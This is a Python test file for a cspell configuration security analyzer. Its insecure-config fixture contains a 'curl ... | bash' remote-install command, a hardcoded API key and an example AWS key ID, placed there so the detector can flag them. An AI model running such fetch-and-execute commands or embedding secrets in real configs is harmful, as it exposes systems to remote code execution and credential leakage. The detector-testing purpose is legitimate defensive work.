"""Tests for CspellAnalyzer."""

from pathlib import Path

from devai.cspell_analyzer import CspellAnalyzer, CspellFinding

HARDENED_CONFIG = """\
{
  "version": "0.2",
  "language": "en",
  "enabled": true,
  "useGitignore": true,
  "minWordLength": 4,
  "maxNumberOfProblems": 100,
  "ignorePaths": ["node_modules", "dist"],
  "flagWords": ["hte", "teh"]
}
"""

INSECURE_CONFIG = """\
{
  "enabled": false,
  "minWordLength": 20,
  "maxNumberOfProblems": 0,
  "checkLimit": 0,
  "ignorePaths": ["security/*", "docs/compliance/**", "**"],
  "ignoreRegExpList": [".*"],
  "import": "https://example.com/cspell.json",
  "dictionaryDefinitions": [
    {"name": "remote", "path": "http://example.com/words.txt"}
  ],
  "api_key": "supersecret123",
  "AKIAIOSFODNN7EXAMPLE",
  "script": "curl http://example.com/install.sh | bash"
}
"""


class TestCspellAnalyzer:
    def test_detects_insecure_patterns(self, tmp_path: Path):
        (tmp_path / "cspell.json").write_text(INSECURE_CONFIG, encoding="utf-8")
        analyzer = CspellAnalyzer(str(tmp_path))
        kinds = {f.kind for f in analyzer.analyze()}
        assert "spellcheck_disabled" in kinds
        assert "min_word_length_high" in kinds
        assert "max_problems_zero" in kinds
        assert "check_limit_zero" in kinds
        assert "ignore_sensitive_path" in kinds
        assert "ignore_wildcard" in kinds
        assert "broad_ignore_regexp" in kinds
        assert "remote_import" in kinds
        assert "remote_dictionary" in kinds
        assert "hardcoded_secret" in kinds
        assert "curl_pipe_shell" in kinds
        assert analyzer.stats.config_files == 1

    def test_hardened_config_has_no_high_findings(self, tmp_path: Path):
        (tmp_path / "cspell.json").write_text(HARDENED_CONFIG, encoding="utf-8")
        analyzer = CspellAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        high = [f for f in findings if f.severity == "high"]
        assert high == []
        assert analyzer.health_score() == 100.0

    def test_no_config_returns_full_score(self, tmp_path: Path):
        analyzer = CspellAnalyzer(str(tmp_path))
        assert analyzer.stats.config_files == 0
        assert analyzer.health_score() == 100.0
        assert "none found" in analyzer.summary()

    def test_finding_format(self):
        finding = CspellFinding(
            kind="spellcheck_disabled",
            severity="high",
            message="test message",
            path="cspell.json",
            lineno=3,
        )
        assert "cspell.json:3" in finding.format()

    def test_to_context(self, tmp_path: Path):
        (tmp_path / "cspell.json").write_text(HARDENED_CONFIG, encoding="utf-8")
        context = CspellAnalyzer(str(tmp_path)).to_context()
        assert "cspell config analysis" in context
        assert "health score" in context

    def test_yaml_config(self, tmp_path: Path):
        (tmp_path / ".cspell.yaml").write_text(
            "enabled: false\nminWordLength: 18\n",
            encoding="utf-8",
        )
        analyzer = CspellAnalyzer(str(tmp_path))
        kinds = {f.kind for f in analyzer.analyze()}
        assert "spellcheck_disabled" in kinds
        assert "min_word_length_high" in kinds

    def test_package_json_config(self, tmp_path: Path):
        (tmp_path / "package.json").write_text(
            '{"name":"demo","cspell":{"enabled":false}}',
            encoding="utf-8",
        )
        analyzer = CspellAnalyzer(str(tmp_path))
        assert analyzer.stats.config_files == 1
        assert any(f.kind == "spellcheck_disabled" for f in analyzer.analyze())

    def test_generate_hardened_template(self):
        template = CspellAnalyzer(".").generate_hardened_template()
        assert '"enabled": true' in template
        assert "ignorePaths" in template
